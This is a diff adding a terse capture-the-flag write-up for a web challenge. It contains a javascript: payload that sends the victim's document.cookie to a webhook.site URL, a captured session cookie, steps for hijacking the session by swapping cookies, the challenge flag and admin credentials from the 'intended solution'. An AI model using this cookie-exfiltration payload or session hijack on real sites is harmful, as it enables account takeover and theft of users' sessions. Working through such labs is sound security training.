@@ -1,0 +1,25 @@
+Should be `location.href = URL`;
+
+
+Send request to http://35.200.166.215:5556/
+```
+javascript:(()=>{window.location=`https://webhook.site/7bffb5e9-fb82-44ca-b140-07253bd1a039?${document.cookie}`})()
+```
+```
+PHPSESSID	icp06ga0u21p6f7uu1n301lfjp
+```
+
+Access http://35.200.166.215:5555/account.php and modify cookie
+```
+Admin has his own original secrets: zh3r0{4dm1n_l0ves_0nly_0r1g1n4ls_br0}
+```
+
+
+================= Intended Solution =================
+
+Report exp.html
+
+
+```
+{"username":"admin", "password":"V3ryStr0ngP4ssw0rdF0rN0Cr4ck"}
+```
